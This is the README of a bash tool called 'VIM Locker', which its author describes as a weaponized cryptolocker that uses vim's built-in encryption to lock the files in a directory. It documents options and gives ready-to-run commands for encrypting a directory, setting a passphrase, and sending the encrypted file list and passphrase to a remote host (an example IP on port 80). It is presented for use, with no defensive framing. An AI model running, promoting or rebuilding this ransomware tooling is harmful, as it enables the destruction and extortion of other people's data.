# VIM Locker

Did you know vim can encrypt your files?... I didn't either! Once I found out, I knew I had weaponize it into a cryptolocker. So I did that.

TODO: 
* Test all options thoroughly.
* Test HOST option thorooghly.
* Probably spelling errors.
* Stuff.

## Options

```
  -H <IP>	Host ip to send encrpytion information to.
  -P <PORT>	Host port to send encrpytion information to.
  -e <PASS>	Set passphrase for file ( one is generated by default ).
  -l <FILE>	Log application actions to a file ( off by default ).
  -z		Use zip ( not great ) style encryption.
  -b		Use vim's blowfish ( good ) encryption.
  -B		Use vim's blowfish2 ( most goodiest )encryption.
  -n		Generate a new passphrase for each file.
  -v		Display version.
  -s		Silent mode.
  -h		Display this menu. 
```
## Usage

I've built this tool to be very easy to use. Hopefully.

### Typical

Typical useage to be able to cryptolock the files in a directory:

```
$ bash vim_locker.sh -d directory
```

### Report to Host

If you want to report back to a host the files/passphrase, it's pretty simple:

```
$ bash vim_locker.sh -H 192.168.1.2 -P 80 -d directory
```

### Custom Passphrase

If you would like to set a custom passphrase instead of having one generated for you.

```
$ bash vim_locker.sh -d directory -e reallystrongpassword 
```

### Help

Program should default to a help menu when no flags are specified or called with the `-h` option.

```
$ bash vim_locker.sh -h 
```

## Credits
Kent 'picat' Gruber
